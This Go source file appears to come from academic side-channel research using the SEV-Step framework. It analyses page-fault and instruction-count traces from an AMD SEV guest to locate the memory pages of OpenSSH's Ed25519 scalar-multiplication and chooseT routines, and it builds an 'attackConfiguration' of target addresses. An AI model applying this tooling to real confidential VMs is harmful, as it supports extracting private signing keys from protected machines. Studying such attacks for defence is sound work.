package main

import (
	"fmt"
	"log"
	"math"
	"sort"

	"github.com/UzL-ITS/sev-step/sevStep"
)

type attackConfiguration struct {
	fe64GPA    uint64
	chosetTGPA uint64
}

//extractScalarMulBaseGPA returns the gpa of the page containing
//"ge25519_scalarmult_base" from openSSH
func extractScalarMulBaseGPA(events []*sevStep.Event) (uint64, error) {

	//By Manual Analysis: event after the event with this retired instruction value is the one we want
	const magicRetInstr = 20863

	for i, v := range events {
		if !v.HaveRetiredInstructions {
			return 0, fmt.Errorf("expected all events to have retired instruction info")
		}

		if v.RetiredInstructions == magicRetInstr && i+1 < len(events) {
			return events[i+1].FaultedGPA, nil
		}
	}

	return 0, fmt.Errorf("did not find magic retired instruction marker %v", magicRetInstr)
}

func filterScalarMulBaseCall(events []*sevStep.Event) ([]*sevStep.Event, error) {
	//By Manual Analysis: event after the event with this retired instruction value is the one we want
	const magicRetInstr = 20863

	startIDX := -1
	for i, v := range events {
		if !v.HaveRetiredInstructions {
			return nil, fmt.Errorf("expected all events to have retired instruction info")
		}

		if v.RetiredInstructions == magicRetInstr {
			startIDX = i
			break
		}
	}
	if startIDX == -1 {
		return nil, fmt.Errorf("did not find magi marker :(")
	}

	buf := []*sevStep.Event{events[startIDX]}
	for _, v := range events[startIDX+1:] {
		buf = append(buf, v)
		if v.FaultedGPA == events[startIDX].FaultedGPA {
			break
		}
	}
	return buf, nil
}

func printRIPFrequencies(events []*sevStep.Event, ignoreGPA uint64) error {
	ripCounter := make(map[uint64]uint64)

	for _, v := range events {
		if !v.HaveRipInfo {
			return fmt.Errorf("encountered event without rip info")
		}
		if v.FaultedGPA == ignoreGPA {
			continue
		}
		ripCounter[v.RIP]++
	}

	type ripCountTuple struct {
		EventID uint64
		RIP     uint64
		Count   uint64
	}
	tuples := make([]ripCountTuple, 0, len(ripCounter))
	for rip, count := range ripCounter {
		tuples = append(tuples, ripCountTuple{

			RIP:   rip,
			Count: count,
		})
	}

	sort.Slice(tuples, func(i, j int) bool {
		return tuples[i].Count < tuples[j].Count
	})

	matches := 0
	for _, v := range tuples {
		if v.Count > 80 && v.Count < 86 && v.RIP < 0xffffffff00000000 {
			log.Printf("RIP 0x%08x\tCount %v\n", v.RIP, v.Count)
			matches++
		}
	}
	log.Printf("Found %v matches\n", matches)
	return nil

}

func printToggleSequences(events []*sevStep.Event) error {
	counter := make(map[string]int, 0)
	windowToKey := func(w []*sevStep.Event) string {
		//build gpa->gpa-> ... string
		str := ""
		for i, v := range w {
			if i == len(w)-1 {
				str += fmt.Sprintf("0x%x", v.FaultedGPA)

			} else {
				str += fmt.Sprintf("0x%x->", v.FaultedGPA)
			}
		}
		return str
	}

	const windowSize = 2
	for startIDX := 0; startIDX < windowSize; startIDX++ {
		window := events[startIDX : windowSize+startIDX]
		lenCurrentRun := 0
		for i := windowSize; i < len(events)-windowSize; {
			//check if next windowSize events match current window
			windowContinues := true
			for j := range window {
				if events[i+j].FaultedGPA != window[j].FaultedGPA {
					windowContinues = false
					break
				}
			}
			//If window matches, slide forward by windowSize
			//else slide window only by one
			if windowContinues {
				i += windowSize
				lenCurrentRun++
			} else {
				//count longest consecutive sequence
				old := counter[windowToKey(window)]
				counter[windowToKey(window)] = int(math.Max(float64(old), float64(lenCurrentRun)))
				lenCurrentRun = 0

				//+-1 because start is inclusive and end is exclusive
				window = events[i-windowSize+1 : i+1]
				i++
			}
		}
	}

	log.Printf("Found %v sequences, printing a filtered list\n", len(counter))
	for sequence, count := range counter {
		if count > 100 {
			log.Printf("Sequence %v Count %v\n", sequence, count)
		}
	}
	return nil
}

func generateAttackConfig(app *application, events []*sevStep.Event) (*attackConfiguration, error) {
	/*
		targetGPA, err := extractScalarMulBaseGPA(events)
		if err != nil {
			return nil, fmt.Errorf("failed to find target gpa : %v", err)
		}

		if app.dbgScalarMultGPA != 0 {
			log.Printf("Fixing extracted scalarMul GPA with provided dbg GPA")
			targetGPA = app.dbgScalarMultGPA
		}

		log.Printf("Target GPA is 0x%x\n", targetGPA)

		eventsInScalarMulCall, err := filterScalarMulBaseCall(events)
		if err != nil {
			return nil, fmt.Errorf("filterScalarMulBaseCall failed : %v", err)
		}
		chooseTGPAEvent := eventsInScalarMulCall[4] //offset my manual analysis
		log.Printf("chooseT gpa: 0x%x rip 0x%x", chooseTGPAEvent.FaultedGPA, chooseTGPAEvent.RIP)
		log.Printf("Other rips on chhoseT GPA")
		uniqueRIPs := make(map[uint64]bool, 0)
		for _, v := range eventsInScalarMulCall {
			if v.FaultedGPA == chooseTGPAEvent.FaultedGPA {
				uniqueRIPs[v.RIP] = true
			}
		}
		for k, v := range uniqueRIPs {
			if v {
				log.Printf("RIP 0x%x\n", k)
			}
		}

		//frequency analysis on RIPs
		if err := printRIPFrequencies(events, 0); err != nil {
			return nil, fmt.Errorf("printRIPFrequencies  failed : %v", err)
		}


			if err := printToggleSequences(events); err != nil {
				return nil, fmt.Errorf("printToggleSequences failed : %v\n", err)
			}

		config := &attackConfiguration{
			fe64GPA: targetGPA,
			chosetTGPA:   chooseTGPAEvent.FaultedGPA,
		}


		return config, nil
	*/

	const magicInstrCountChooseT = 9068
	foundSequence := false
	var chooseTGPA, basePageGPA uint64
	for i, v := range events {
		if v.RetiredInstructions == magicInstrCountChooseT && i > 0 && i < len(events)-1 {
			chooseTGPA = v.FaultedGPA
			basePageGPA = events[i+1].FaultedGPA
			foundSequence = true
			log.Printf("Base Page event : %v\n", events[i-1])
			log.Printf("Chose t event : %v\n", v)
			break
		}
	}

	if !foundSequence {
		return nil, fmt.Errorf("did not find sequence")
	}

	cfg := &attackConfiguration{
		fe64GPA:    basePageGPA,
		chosetTGPA: chooseTGPA,
	}

	return cfg, nil
}
